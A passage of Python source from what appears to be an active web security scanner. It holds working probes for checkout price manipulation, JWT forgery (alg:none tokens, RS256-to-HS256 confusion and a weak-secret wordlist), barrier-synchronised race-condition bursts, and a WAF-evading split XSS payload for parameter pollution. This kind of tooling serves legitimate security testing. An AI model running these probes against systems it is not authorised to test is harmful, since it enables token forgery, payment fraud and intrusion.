            num = _price_extract_numeric(resp_val)
            if num is None:
                continue
            if num < 0:
                snippet = f"response field '{resp_path}' = {resp_val!r}"
                return "HIGH", (
                    f"Server returned negative value ({resp_val!r}) in '{resp_path}' "
                    f"after setting '{field_path}' to {probe_val!r}. {snippet}"
                )
            if num == 0 and probe_val in (0, -1, -0.01):
                # Zero total after a zero/negative probe — likely processed
                snippet = f"response field '{resp_path}' = {resp_val!r}"
                return "HIGH", (
                    f"Server returned zero total in '{resp_path}' after setting "
                    f"'{field_path}' to {probe_val!r}. {snippet}"
                )

    # Success phrases without explicit total confirmation → MEDIUM
    if resp.status_code == 200 and _PRICE_SUCCESS_RE.search(body_text):
        excerpt = _PRICE_SUCCESS_RE.search(body_text).group(0)[:120]
        return "MEDIUM", (
            f"Server returned 200 with success phrase after setting "
            f"'{field_path}' to {probe_val!r}. Response excerpt: {excerpt!r}"
        )

    # 200 with no rejection and no success — ambiguous; report MEDIUM
    if resp.status_code == 200 and not _PRICE_REJECT_RE.search(body_text):
        excerpt = body_text[:200].strip()
        return "MEDIUM", (
            f"Server accepted request without error after setting "
            f"'{field_path}' to {probe_val!r} (HTTP 200, no validation error). "
            f"Response prefix: {excerpt!r}"
        )

    return None, None


def check_price_manipulation(page_url: str, html_content) -> None:
    """
    Client-side price manipulation detection.

    Discovers checkout/payment endpoints from the page URL and any form
    actions/links on the page.  For each endpoint that accepts a JSON body
    containing price or quantity fields, resends the request with manipulated
    values (negative price, zero price, zero/negative quantity, missing field)
    and inspects the response for signs of acceptance.

    Probes:
      - Negative price  : field → -1
      - Zero price      : field → 0
      - Fractional neg  : field → -0.01
      - Zero quantity   : quantity/qty field → 0
      - Negative qty    : quantity/qty field → -1
      - Field removal   : remove the price field entirely

    Flags HIGH if response contains a negative/zero total or explicit success.
    Flags MEDIUM if server returns 200 without a validation error.

    Detection-only — does not complete any purchase or submit payment details.
    Deduplicates per endpoint.  8-second timeout per probe.
    Only called when --active-probes is enabled.
    """
    if not is_in_scope(page_url):
        return
    domain = urlparse(page_url).netloc
    if is_third_party_cdn(domain):
        return

    # ── Collect candidate URLs from the page ──────────────────────────────────
    candidate_urls = set()

    # 1. The page URL itself if it matches the keyword pattern
    if _PRICE_URL_RE.search(urlparse(page_url).path):
        candidate_urls.add(page_url)

    # 2. Form actions and links on the page
    try:
        text = html_content if isinstance(html_content, str) \
               else html_content.decode("utf-8", errors="ignore")
        soup = BeautifulSoup(text, "lxml")
    except Exception:
        soup = None

    if soup:
        for tag in soup.find_all(["form", "a"]):
            href = tag.get("action") or tag.get("href") or ""
            if not href:
                continue
            resolved = urljoin(page_url, href)
            if _PRICE_URL_RE.search(urlparse(resolved).path):
                candidate_urls.add(resolved)

    if not candidate_urls:
        return

    waf_note = ""
    waf_vendor = _waf_results.get(domain)
    if waf_vendor:
        waf_note = f" [WAF: {waf_vendor} detected]"

    for endpoint in candidate_urls:
        if endpoint in _price_tested:
            continue
        _price_tested.add(endpoint)

        ep_parsed = urlparse(endpoint)
        if is_third_party_cdn(ep_parsed.netloc):
            continue

        # ── Probe with GET to capture a baseline JSON body ─────────────────
        baseline_json = None
        try:
            stealth_delay(domain)
            r0 = _get_session().get(
                endpoint,
                headers={**create_request_header(), "Accept": "application/json"},
                timeout=8,
                allow_redirects=True,
            )
            if r0 and r0.status_code == 200:
                baseline_json = r0.json()
        except Exception:
            pass

        if baseline_json is None:
            # No JSON baseline — nothing to manipulate
            continue

        # ── Find price/quantity fields in the baseline ─────────────────────
        fields = list(_price_find_fields(baseline_json))
        if not fields:
            continue

        print(timestamp() + f" Price manipulation probe: {endpoint} "
              f"fields={[p for p, _ in fields]}")

        for field_path, orig_val in fields:
            orig_num = _price_extract_numeric(orig_val)
            field_key = field_path.split(".")[-1].lower()
            is_qty    = field_key in {"quantity", "qty"}

            # Build the probe set for this field
            probes = []
            if is_qty:
                probes = [("zero qty",     0),
                          ("negative qty", -1)]
            else:
                probes = [("negative price",    -1),
                          ("zero price",         0),
                          ("fractional neg",    -0.01)]

            # Also probe field removal (all field types)
            probes.append(("field removal", None))

            for probe_label, probe_val in probes:
                try:
                    if probe_val is None:
                        # Remove the field entirely
                        import copy
                        modified = copy.deepcopy(baseline_json)
                        # Walk to parent and delete the key
                        parts = [p for p in
                                 field_path.replace("]", "").replace("[", ".").split(".")
                                 if p]
                        node = modified
                        for k in parts[:-1]:
                            node = node[int(k)] if k.isdigit() else node[k]
                        last = parts[-1]
                        if last.isdigit():
                            del node[int(last)]
                        elif last in node:
                            del node[last]
                        else:
                            continue   # field not at expected path
                    else:
                        modified = _price_set_nested(baseline_json, field_path, probe_val)

                    stealth_delay(domain)
                    resp = _get_session().post(
                        endpoint,
                        json=modified,
                        headers={**create_request_header(),
                                 "Content-Type": "application/json"},
                        timeout=8,
                        allow_redirects=False,   # don't follow — stop before any commit
                    )

                    sev, evidence = _price_response_signals(
                        resp, baseline_json, field_path, probe_val
                    )
                    if sev:
                        alert(
                            "PRICE MANIPULATION",
                            sev,
                            endpoint,
                            f"Probe '{probe_label}': {evidence}{waf_note}",
                        )
                        print(timestamp() + f" [!] Price manipulation ({sev}) "
                              f"at {endpoint} field={field_path} probe={probe_label}")

                except Exception:
                    pass


# ─────────────────────────────────────────────
# JWT algorithm confusion detection
# ─────────────────────────────────────────────

# Regex: three base64url segments separated by dots — standard JWT shape
_JWT_RE = re.compile(
    r'eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+\.[A-Za-z0-9_-]*'
)

# JSON body field names that commonly carry JWTs
_JWT_BODY_FIELDS = frozenset({
    "token", "jwt", "access_token", "id_token", "auth_token",
    "accessToken", "idToken", "authToken",
})

# Known demo / test tokens to skip (jwt.io example)
_JWT_DEMO_PREFIXES = (
    "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9"
    ".eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ",
)

# Well-known public-key / JWKS discovery paths
_JWT_JWKS_PATHS = [
    "/.well-known/jwks.json",
    "/.well-known/openid-configuration",
    "/oauth/token_key",
    "/api/oauth/token_key",
]

# Common weak HS256 secrets to try
_JWT_WEAK_SECRETS = [
    "secret", "password", "123456", "qwerty", "letmein",
    "your-256-bit-secret", "your-secret", "mysecret",
    "jwt-secret", "app-secret", "api-secret", "token-secret",
    "development", "staging", "production", "test",
]

_jwt_tested: set = set()   # (host, token_fingerprint) already probed


def _jwt_b64_decode(segment: str) -> bytes:
    """Decode a base64url segment with missing-padding tolerance."""
    pad = 4 - len(segment) % 4
    if pad != 4:
        segment += "=" * pad
    return __import__("base64").urlsafe_b64decode(segment)


def _jwt_b64_encode(data: bytes) -> str:
    """Encode bytes as unpadded base64url."""
    return __import__("base64").urlsafe_b64encode(data).rstrip(b"=").decode()


def _jwt_parse(token: str):
    """
    Return (header_dict, payload_dict, header_seg, payload_seg, sig_seg)
    or None if the token cannot be decoded.
    """
    parts = token.split(".")
    if len(parts) != 3:
        return None
    try:
        hdr  = json.loads(_jwt_b64_decode(parts[0]))
        body = json.loads(_jwt_b64_decode(parts[1]))
        return hdr, body, parts[0], parts[1], parts[2]
    except Exception:
        return None


def _jwt_build_none_token(header_seg: str, payload_seg: str) -> str:
    """Craft a token with alg:none and an empty signature."""
    new_hdr = _jwt_b64_encode(
        json.dumps({"alg": "none", "typ": "JWT"}, separators=(",", ":")).encode()
    )
    return f"{new_hdr}.{payload_seg}."


def _jwt_probe_request(page_url: str, token: str, domain: str):
    """
    Re-issue the same page request with *token* substituted.  Returns the
    response or None on error.  Sets the token in both Authorization and a
    generic Cookie header so we hit whichever the server checks.
    """
    probe_headers = {
        **create_request_header(),
        "Authorization": f"Bearer {token}",
        "Cookie": f"token={token}; access_token={token}",
    }
    try:
        return _get_session().get(
            page_url,
            headers=probe_headers,
            timeout=8,
            allow_redirects=True,
            verify=False,
        )
    except Exception:
        return None


def _jwt_accepted(resp) -> bool:
    """Return True if the server treated the token as valid (not 401/403)."""
    if resp is None:
        return False
    return resp.status_code not in (401, 403)


def _jwt_fetch_public_key(base_url: str, domain: str):
    """
    Try known JWKS/OpenID paths and return (pem_bytes, source_url) for the
    first RSA public key found, or (None, None).
    """
    if not _CRYPTO_AVAILABLE:
        return None, None
    from cryptography.hazmat.primitives.serialization import Encoding, PublicFormat
    for path in _JWT_JWKS_PATHS:
        url = base_url.rstrip("/") + path
        try:
            stealth_delay(domain)
            resp = _get_session().get(
                url, headers=create_request_header(), timeout=8, verify=False
            )
            if resp is None or resp.status_code != 200:
                continue

            # Opportunistic MEDIUM alert: public-key endpoint exposed without auth
            alert(
                "JWT PUBLIC KEY ENDPOINT EXPOSED",
                "MEDIUM",
                url,
                f"JWKS/OpenID endpoint accessible without authentication at {url}. "
                f"Exposes the public key used to verify JWT signatures.",
            )

            ct = resp.headers.get("Content-Type", "")
            data = resp.json()

            # /.well-known/openid-configuration → follow jwks_uri
            if "jwks_uri" in data:
                jwks_url = data["jwks_uri"]
                try:
                    stealth_delay(domain)
                    r2 = _get_session().get(
                        jwks_url, headers=create_request_header(), timeout=8, verify=False
                    )
                    if r2 and r2.status_code == 200:
                        data = r2.json()
                        url  = jwks_url
                except Exception:
                    continue

            # Standard JWKS — extract first RSA key
            for key_obj in data.get("keys", []):
                if key_obj.get("kty") != "RSA":
                    continue
                try:
                    from cryptography.hazmat.primitives.asymmetric.rsa import (
                        RSAPublicNumbers,
                    )
                    import base64 as _b64
                    def _b64url_to_int(s):
                        pad = 4 - len(s) % 4
                        if pad != 4:
                            s += "=" * pad
                        return int.from_bytes(_b64.urlsafe_b64decode(s), "big")

                    n = _b64url_to_int(key_obj["n"])
                    e = _b64url_to_int(key_obj["e"])
                    pub = RSAPublicNumbers(e, n).public_key(_crypto_backend())
                    pem = pub.public_bytes(Encoding.PEM, PublicFormat.SubjectPublicKeyInfo)
                    return pem, url
                except Exception:
                    continue

            # /oauth/token_key — Spring-style PEM response
            if "value" in data and "BEGIN" in str(data.get("value", "")):
                return data["value"].encode(), url

        except Exception:
            continue
    return None, None


def check_jwt_confusion(page_url: str, html_content, response_headers: dict) -> None:
    """
    JWT algorithm confusion detection.

    Extracts JWT tokens from:
      - Authorization: Bearer header in the response
      - Set-Cookie response header values
      - JSON body fields: token, jwt, access_token, id_token, auth_token

    For each unique token (per host) runs three attack probes:

    1. alg:none attack
       Replaces the algorithm with "none" and strips the signature.
       Flags CRITICAL if the server returns non-401/403.

    2. RS256→HS256 confusion (asymmetric tokens only)
       Fetches the server's public key from JWKS / OpenID endpoints.
       Signs a new token with HS256 using the raw PEM as the HMAC secret.
       Flags CRITICAL if accepted.

    3. Weak secret brute-force (HS256 tokens only)
       Tries a short wordlist of common secrets via PyJWT decode.
       Flags HIGH on first match; does NOT forge a new request with the cracked
       token — only reports that the secret is known.

    Detection-only — payload claims are never modified.
    Deduplicates per (host, token fingerprint).
    8-second timeout per probe.
    Only called when --active-probes is enabled.
    """
    if not is_in_scope(page_url):
        return
    if not _PYJWT_AVAILABLE:
        return
    domain = urlparse(page_url).netloc
    if is_third_party_cdn(domain):
        return

    base_url = urlparse(page_url).scheme + "://" + domain

    # ── Token extraction ──────────────────────────────────────────────────────
    candidates: list[str] = []

    hdrs = {k.lower(): v for k, v in response_headers.items()} if response_headers else {}

    # Authorization: Bearer <token>
    auth_hdr = hdrs.get("authorization", "")
    if auth_hdr.lower().startswith("bearer "):
        t = auth_hdr.split(" ", 1)[1].strip()
        if _JWT_RE.match(t):
            candidates.append(t)

    # Set-Cookie values
    for cookie_val in hdrs.get("set-cookie", "").split(";"):
        for m in _JWT_RE.finditer(cookie_val):
            candidates.append(m.group(0))

    # JSON body fields
    if html_content:
        body_s = (
            html_content if isinstance(html_content, str)
            else html_content.decode("utf-8", errors="replace")
        )
        # Fast path: look for known field names first
        for field in _JWT_BODY_FIELDS:
            for m in re.finditer(
                r'"' + re.escape(field) + r'"\s*:\s*"(' + _JWT_RE.pattern + r')"',
                body_s,
            ):
                candidates.append(m.group(1))
        # Fallback: any JWT-shaped value anywhere in the body
        for m in _JWT_RE.finditer(body_s):
            candidates.append(m.group(0))

    if not candidates:
        return

    # ── Deduplicate and skip known demo tokens ────────────────────────────────
    seen_fps: set = set()
    for raw_token in candidates:
        # fingerprint = first 40 chars of header+payload (avoids per-expiry noise)
        fp_key = raw_token[:raw_token.rfind(".")] if raw_token.count(".") == 2 else raw_token
        fp_key = fp_key[:80]
        global_key = (domain, fp_key)

        if global_key in _jwt_tested:
            continue
        if any(raw_token.startswith(p) for p in _JWT_DEMO_PREFIXES):
            continue
        if fp_key in seen_fps:
            continue
        seen_fps.add(fp_key)
        _jwt_tested.add(global_key)

        parsed = _jwt_parse(raw_token)
        if parsed is None:
            continue
        hdr_dict, payload_dict, hdr_seg, pay_seg, sig_seg = parsed
        alg = hdr_dict.get("alg", "none").upper()

        print(timestamp() + f" JWT probe: {domain} alg={alg}")

        waf_note = ""
        waf_vendor = _waf_results.get(domain)
        if waf_vendor:
            waf_note = f" [WAF: {waf_vendor} detected]"

        # ── 1. alg:none attack ────────────────────────────────────────────────
        none_token = _jwt_build_none_token(hdr_seg, pay_seg)
        resp_none  = _jwt_probe_request(page_url, none_token, domain)
        if _jwt_accepted(resp_none):
            alert(
                "JWT ALGORITHM CONFUSION: alg:none ACCEPTED",
                "CRITICAL",
                page_url,
                f"Server accepted a JWT with alg=none (empty signature) — "
                f"original algorithm was '{alg}'. The server is not enforcing "
                f"algorithm validation, allowing full token forgery without a secret.{waf_note}",
            )
            print(timestamp() + f" [!!] JWT alg:none accepted on {domain}")

        # ── 2. RS256 → HS256 confusion ────────────────────────────────────────
        if alg in ("RS256", "RS384", "RS512", "ES256", "ES384", "ES512",
                   "PS256", "PS384", "PS512"):
            pub_pem, jwks_url = _jwt_fetch_public_key(base_url, domain)
            if pub_pem:
                try:
                    # Sign a new token with HS256 using the raw PEM as the secret
                    hs256_token = _pyjwt.encode(
                        payload_dict,
                        pub_pem,
                        algorithm="HS256",
                    )
                    # PyJWT >= 2 returns str; older returns bytes
                    if isinstance(hs256_token, bytes):
                        hs256_token = hs256_token.decode()

                    stealth_delay(domain)
                    resp_hs = _jwt_probe_request(page_url, hs256_token, domain)
                    if _jwt_accepted(resp_hs):
                        alert(
                            "JWT ALGORITHM CONFUSION: RS256→HS256 ACCEPTED",
                            "CRITICAL",
                            page_url,
                            f"Server accepted a token re-signed with HS256 using the "
                            f"server's RSA public key as the HMAC secret (key from "
                            f"{jwks_url}). An attacker can forge arbitrary tokens "
                            f"using only the public key.{waf_note}",
                        )
                        print(timestamp() + f" [!!] JWT RS256→HS256 confusion on {domain}")
                except Exception:
                    pass

        # ── 3. Weak secret brute-force (HS* tokens only) ─────────────────────
        if alg.startswith("HS"):
            cracked_secret = None
            for secret in _JWT_WEAK_SECRETS:
                try:
                    _pyjwt.decode(
                        raw_token,
                        secret,
                        algorithms=[alg],
                        options={"verify_exp": False},
                    )
                    cracked_secret = secret
                    break
                except Exception:
                    pass

            if cracked_secret is not None:
                alert(
                    "JWT WEAK SECRET",
                    "HIGH",
                    page_url,
                    f"HS256 JWT secret cracked from common wordlist — "
                    f"secret is {cracked_secret!r}. An attacker can forge "
                    f"arbitrary tokens with full control over all claims.{waf_note}",
                )
                print(timestamp() + f" [!!] JWT weak secret '{cracked_secret}' on {domain}")


# ─────────────────────────────────────────────
# Race condition detection
# ─────────────────────────────────────────────

# URL path patterns that indicate a state-changing endpoint worth probing.
# Grouped by category so findings can name the likely operation.
_RACE_ENDPOINT_PATTERNS: list[tuple[re.Pattern, str]] = [
    (re.compile(r'/(?:coupon|promo|voucher|discount|redeem|code)',   re.I), "coupon/promo redemption"),
    (re.compile(r'/(?:reset|forgot)[_-]?password|/password[_-]?reset', re.I), "password reset"),
    (re.compile(r'/(?:register|signup|sign[_-]up|create[_-]account)', re.I), "account registration"),
    (re.compile(r'/(?:upload|attach|import)',                         re.I), "file upload"),
    (re.compile(r'/(?:checkout|payment|pay|purchase|order|buy)',      re.I), "payment/checkout"),
    (re.compile(r'/(?:vote|like|upvote|downvote|react|favorite|fav)', re.I), "vote/like"),
    (re.compile(r'/(?:transfer|withdraw|send|refund)',                 re.I), "financial transfer"),
    (re.compile(r'/(?:verify|confirm|activate|token)',                 re.I), "token consumption"),
    (re.compile(r'/(?:rate|limit|throttle)',                           re.I), "rate-limited endpoint"),
]

# Paths that should never be race-tested (destructive or noisy)
_RACE_BLOCKLIST_RE = re.compile(
    r'/(?:delete|destroy|remove|drop|purge|wipe|clear|flush|truncate'
    r'|logout|signout|sign[_-]out|disable|deactivate|ban|suspend)',
    re.I,
)

_RACE_THREADS    = 10        # simultaneous requests per probe
_RACE_TIMEOUT    = 10        # seconds per request
_RACE_MIN_OK     = 2         # minimum 200/201 count to flag HIGH
_race_tested: set = set()    # endpoints already probed


def _race_endpoint_category(path: str) -> str | None:
    """
    Return the human-readable category for *path* if it matches a race-prone
    pattern, or None if it should not be tested.
    """
    if _RACE_BLOCKLIST_RE.search(path):
        return None
    for pattern, category in _RACE_ENDPOINT_PATTERNS:
        if pattern.search(path):
            return category
    return None


def _race_fire(url: str, method: str, barrier: threading.Barrier,
               results: list, idx: int) -> None:
    """
    Worker thread: wait at the barrier, then fire one request and record
    (status_code, elapsed_ms, body) in results[idx].
    """
    try:
        barrier.wait()   # synchronise launch with all other threads
        t0   = time.monotonic()
        resp = _get_session().request(
            method,
            url,
            headers=create_request_header(),
            timeout=_RACE_TIMEOUT,
            allow_redirects=False,   # don't follow — avoids unintended side-effects
            verify=False,
        )
        elapsed_ms = int((time.monotonic() - t0) * 1000)
        results[idx] = (resp.status_code, elapsed_ms, resp.text or "")
    except Exception:
        results[idx] = (None, 0, "")


def _race_run_burst(url: str, method: str) -> list:
    """
    Fire _RACE_THREADS simultaneous barrier-synchronised requests.
    Returns a list of (status_code, elapsed_ms, body) tuples for threads
    that returned a response (None entries excluded).
    """
    results = [None] * _RACE_THREADS
    barrier = threading.Barrier(_RACE_THREADS)
    threads = [
        threading.Thread(
            target=_race_fire,
            args=(url, method, barrier, results, i),
            daemon=True,
        )
        for i in range(_RACE_THREADS)
    ]
    for t in threads:
        t.start()
    for t in threads:
        t.join(timeout=_RACE_TIMEOUT + 2)
    return [r for r in results if r is not None and len(r) == 3 and r[0] is not None]


# ── Response-analysis helpers ─────────────────────────────────────────────────

# Patterns that extract identifiers from successful responses.
# Group 1 (when present) is the token/id value; otherwise the full match is used.
_RACE_ID_PATTERNS = [
    re.compile(r'"(?:id|order_id|transaction_id|record_id)"\s*:\s*(\d+)', re.I),
    re.compile(r'[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}', re.I),
    re.compile(r'"(?:token|code|confirmation_code|session_?id|session_?token)"\s*:\s*"([^"]{6,})"', re.I),
]

# Timestamp formats stripped before comparing bodies for identity
_RACE_TIMESTAMP_RE = re.compile(
    r'\d{4}-\d{2}-\d{2}[T ]\d{2}:\d{2}:\d{2}(?:\.\d+)?(?:Z|[+-]\d{2}:?\d{2})?'
    r'|\b\d{10,13}\b',
)


def _race_distinct_ids(ok_bodies: list) -> bool:
    """
    Return True if successful response bodies contain multiple *distinct* IDs,
    UUIDs, or tokens — confirming that separate operations were created.
    """
    if len(ok_bodies) < 2:
        return False
    for pat in _RACE_ID_PATTERNS:
        ids: set = set()
        for body in ok_bodies:
            for m in pat.finditer(body):
                ids.add(m.group(1) if m.lastindex else m.group())
        if len(ids) >= 2:
            return True
    return False


def _race_timestamp_only_diff(body1: str, body2: str) -> bool:
    """Return True if two bodies are identical after stripping timestamp fields."""
    if body1 == body2:
        return True
    return _RACE_TIMESTAMP_RE.sub("__TS__", body1) == _RACE_TIMESTAMP_RE.sub("__TS__", body2)


def _race_idempotency_check(url: str, method: str) -> bool:
    """
    Send the same request twice sequentially (not concurrently).

    Returns True  — endpoint is non-idempotent (results differ or second fails).
    Returns False — endpoint handles duplicates identically (idempotent).
    """
    statuses: list = []
    bodies:   list = []
    for _ in range(2):
        try:
            resp = _get_session().request(
                method, url,
                headers=create_request_header(),
                timeout=_RACE_TIMEOUT,
                allow_redirects=False,
                verify=False,
            )
            statuses.append(resp.status_code)
            bodies.append(resp.text or "")
        except Exception:
            statuses.append(None)
            bodies.append("")

    if len(statuses) < 2 or statuses[0] is None:
        return True   # couldn't test — assume non-idempotent

    s1, s2 = statuses[0], statuses[1]
    b1, b2 = bodies[0],   bodies[1]

    # First succeeds, second fails → endpoint rejects the duplicate → non-idempotent
    if s1 in (200, 201) and s2 not in (200, 201):
        return True
    # Both succeed with different bodies (not just timestamp differences) → non-idempotent
    if s1 in (200, 201) and s2 in (200, 201) and not _race_timestamp_only_diff(b1, b2):
        return True
    # Both succeed with same effective body → idempotent
    return False


def check_race_condition(page_url: str, html_content) -> None:
    """
    Race condition detection via simultaneous barrier-synchronised requests.

    Identifies endpoints on the page (URL + form actions/links) that match
    state-changing path patterns (coupon redemption, password reset, file
    upload, payment, vote/like, token consumption, rate-limited operations).

    For each candidate endpoint:
      1. Sends _RACE_THREADS (10) simultaneous requests using threading.Barrier
         to release all threads at the same instant.
      2. Collects (status_code, elapsed_ms) from every thread.
      3. Flags HIGH  if ≥2 requests return 200/201 (only one should succeed)
         or if response times show a high coefficient of variation (>50 %)
         suggesting a TOCTOU window.
      4. Flags MEDIUM if all requests succeed where rate-limiting should apply,
         or if status codes are inconsistent across threads.

    Detection only — no destructive commands, no financial transactions,
    no more than 10 concurrent requests per endpoint.
    Deduplicates per endpoint URL.
    10-second timeout per request.
    Only called when --active-probes is enabled.
    """
    if not is_in_scope(page_url):
        return
    domain = urlparse(page_url).netloc
    if is_third_party_cdn(domain):
        return

    # ── Collect candidate URLs ────────────────────────────────────────────────
    candidates: list[tuple[str, str]] = []   # (url, http_method)

    def _add_if_race_worthy(raw_url: str, method: str) -> None:
        try:
            resolved = urljoin(page_url, raw_url)
            parsed   = urlparse(resolved)
            if is_third_party_cdn(parsed.netloc):
                return
            path = parsed.path
            if _race_endpoint_category(path) is None:
                return
            # Normalise to scheme+host+path (drop query — we test the endpoint, not params)
            base = parsed.scheme + "://" + parsed.netloc + path
            if base not in _race_tested:
                candidates.append((base, method.upper()))
        except Exception:
            pass

    # Page URL itself
    _add_if_race_worthy(page_url, "GET")

    # Form actions and anchor hrefs from the page
    if html_content:
        try:
            body_s = (html_content if isinstance(html_content, str)
                      else html_content.decode("utf-8", errors="ignore"))
            soup = BeautifulSoup(body_s, "lxml")
        except Exception:
            soup = None

        if soup:
            for form in soup.find_all("form"):
                action = form.get("action") or page_url
                method = (form.get("method") or "POST").strip().upper()
                if method not in ("GET", "POST"):
                    method = "POST"
                _add_if_race_worthy(action, method)
            for tag in soup.find_all("a", href=True):
                _add_if_race_worthy(tag["href"], "GET")

    if not candidates:
        return

    waf_note = ""
    waf_vendor = _waf_results.get(domain)
    if waf_vendor:
        waf_note = f" [WAF: {waf_vendor} detected]"

    for endpoint, method in candidates:
        if endpoint in _race_tested:
            continue
        _race_tested.add(endpoint)

        category = _race_endpoint_category(urlparse(endpoint).path)
        if category is None:
            continue

        print(timestamp() + f" Race condition probe: {endpoint} [{method}] ({category})")
        stealth_delay(domain)

        # ── 3-attempt confirmation loop ───────────────────────────────────
        # Attempt 1 is the initial burst; attempts 2 and 3 follow after 5s waits.
        all_attempts:      list = []   # list of burst result lists
        attempt_ok_counts: list = []   # ok_count per attempt

        for attempt_n in range(1, 4):
            if attempt_n > 1:
                time.sleep(5)
                stealth_delay(domain)

            burst = _race_run_burst(endpoint, method)
            if not burst:
                attempt_ok_counts.append(0)
                all_attempts.append([])
                print(timestamp() + f" [Race] Attempt {attempt_n}/3: 0/0 requests succeeded")
                continue

            ok_count_n = sum(1 for s, ms, b in burst if s in (200, 201))
            attempt_ok_counts.append(ok_count_n)
            all_attempts.append(burst)
            print(timestamp() + f" [Race] Attempt {attempt_n}/3: "
                  f"{ok_count_n}/{len(burst)} requests succeeded")

            # Short-circuit: if attempt 1 shows no signal at all, skip remaining bursts
            if attempt_n == 1:
                status_codes_1 = [s for s, ms, b in burst]
                times_ms_1     = [ms for s, ms, b in burst if ms > 0]
                cv_1 = 0.0
                if len(times_ms_1) > 1:
                    _mean = sum(times_ms_1) / len(times_ms_1)
                    if _mean > 0:
                        _var = sum((t - _mean) ** 2 for t in times_ms_1) / len(times_ms_1)
                        cv_1 = (_var ** 0.5) / _mean

                is_candidate = (
                    ok_count_n >= _RACE_MIN_OK
                    or (cv_1 > 0.5 and ok_count_n >= 1)
                    or (len(set(status_codes_1)) > 1 and ok_count_n >= 1)
                    or (ok_count_n == len(burst) and category == "rate-limited endpoint")
                )
                if not is_candidate:
                    break   # no signal — skip confirmation attempts

        # Use attempt-1 burst for timing summary (already computed above)
        burst1       = all_attempts[0] if all_attempts else []
        valid1       = burst1
        status_codes = [s for s, ms, b in valid1]
        times_ms     = [ms for s, ms, b in valid1 if ms > 0]
        ok_count     = attempt_ok_counts[0] if attempt_ok_counts else 0

        cv = 0.0
        if len(times_ms) > 1:
            _mean = sum(times_ms) / len(times_ms)
            if _mean > 0:
                _var = sum((t - _mean) ** 2 for t in times_ms) / len(times_ms)
                cv   = (_var ** 0.5) / _mean

        status_summary = ", ".join(str(s) for s in sorted(set(status_codes))) if status_codes else "—"
        time_summary   = (f"min={min(times_ms)}ms max={max(times_ms)}ms cv={cv:.0%}"
                          if times_ms else "n/a")

        detail_base = (
            f"Race condition probe on {category} endpoint {endpoint} — "
            f"sent {_RACE_THREADS} simultaneous {method} requests. "
            f"Status codes: {status_summary} ({ok_count}/{len(valid1)} succeeded). "
            f"Response times: {time_summary}.{waf_note}"
        )

        # Count attempts that reproduced a race signal (ok_count >= _RACE_MIN_OK)
        confirmed_attempts = sum(1 for c in attempt_ok_counts if c >= _RACE_MIN_OK)
        if confirmed_attempts < 2 and ok_count >= _RACE_MIN_OK:
            print(timestamp() + f" [Race] Not confirmed "
                  f"({confirmed_attempts}/3 attempts reproduced) — skipping")
            continue

        # Collect all successful response bodies across all confirmed attempts
        all_ok_bodies = [
            b for attempt in all_attempts
            for s, ms, b in attempt if s in (200, 201)
        ]

        # ── Response analysis ─────────────────────────────────────────────
        has_distinct_ids  = _race_distinct_ids(all_ok_bodies)
        all_identical     = len(set(all_ok_bodies)) <= 1 if all_ok_bodies else True
        ts_only_diff      = (
            len(all_ok_bodies) >= 2
            and _race_timestamp_only_diff(all_ok_bodies[0], all_ok_bodies[-1])
        )

        # All responses identical or differ only in timestamps → not a real race
        if (all_identical or ts_only_diff) and ok_count >= _RACE_MIN_OK:
            # Check if most requests were blocked (rate limiting working)
            non_ok = sum(1 for s, ms, b in valid1 if s not in (200, 201))
            if non_ok >= len(valid1) * 0.7:
                continue   # rate limiting is working correctly
            sev          = "MEDIUM"
            alert_title  = "RACE CONDITION: IDENTICAL RESPONSES"
            detail_extra = (" Responses are identical across concurrent requests — "
                            "possible race condition, manual verification required.")

        elif ok_count >= _RACE_MIN_OK or (cv > 0.5 and ok_count >= 1):
            sev          = "HIGH" if has_distinct_ids else "MEDIUM"
            alert_title  = ("RACE CONDITION: DISTINCT IDS RETURNED"
                            if has_distinct_ids else "RACE CONDITION: MULTIPLE SUCCESSES")
            detail_extra = (
                " Multiple distinct IDs/tokens returned across concurrent requests — "
                "confirms separate operations were created."
                if has_distinct_ids else
                " Multiple requests returned success status — "
                "endpoint may lack atomic state guards."
            )

        elif len(set(status_codes)) > 1 and ok_count >= 1:
            sev          = "MEDIUM"
            alert_title  = "RACE CONDITION: INCONSISTENT RESPONSES"
            detail_extra = (" Mixed status codes across simultaneous requests suggest "
                            "non-atomic state handling.")

        elif ok_count == len(valid1) and category == "rate-limited endpoint":
            sev          = "MEDIUM"
            alert_title  = "RACE CONDITION: RATE LIMIT BYPASS"
            detail_extra = (f" All {_RACE_THREADS} simultaneous requests succeeded on a "
                            "rate-limited endpoint — rate limiting may not be enforced atomically.")

        else:
            continue   # no alertable condition

        # ── Idempotency check ─────────────────────────────────────────────
        print(timestamp() + f" [Race] Running idempotency check on {endpoint}")
        non_idempotent = _race_idempotency_check(endpoint, method)
        if not non_idempotent:
            print(timestamp() + " [Race] Endpoint is idempotent — downgrading to LOW")
            sev          = "LOW"
            alert_title  = "RACE CONDITION: IDEMPOTENT ENDPOINT"
            detail_extra += (" Sequential duplicate requests returned the same result — "
                             "endpoint may handle duplicates correctly, but concurrent "
                             "timing window may still exist.")
        elif has_distinct_ids:
            print(timestamp() + " [Race] Confirmed — multiple success responses with distinct IDs")
        else:
            print(timestamp() + f" [Race] Confirmed — non-idempotent endpoint "
                  f"({confirmed_attempts}/3 attempts reproduced)")

        alert(alert_title, sev, endpoint, detail_base + detail_extra)
        if sev in ("HIGH", "CRITICAL"):
            print(timestamp() + f" [!!] Race condition ({alert_title}) at {endpoint}")
        else:
            print(timestamp() + f" [!] Race condition ({alert_title}) at {endpoint}")


# ─────────────────────────────────────────────
# HTTP Parameter Pollution (HPP) detection
# ─────────────────────────────────────────────

_HPP_XSS_SPLIT = ("<scr", "ipt>")   # split across two param values to evade WAF concat checks
_HPP_CANARY    = "hpp-probe-6a9b"    # benign canary reflected in response → parsing discrepancy
_hpp_tested: set = set()             # (base_url, param) pairs already probed


def check_hpp(page_url: str, html_content) -> None:
    """
    HTTP Parameter Pollution detection.

    For each URL query parameter found on the page (current URL + linked hrefs
    + form actions), sends three probes:

      1. Duplicate order-A  ?param=orig&param=canary  — does the server use the
         second value?  (reverse: ?param=canary&param=orig)
      2. WAF bypass split  ?param=<scr&param=ipt>alert(1)</script>  — does
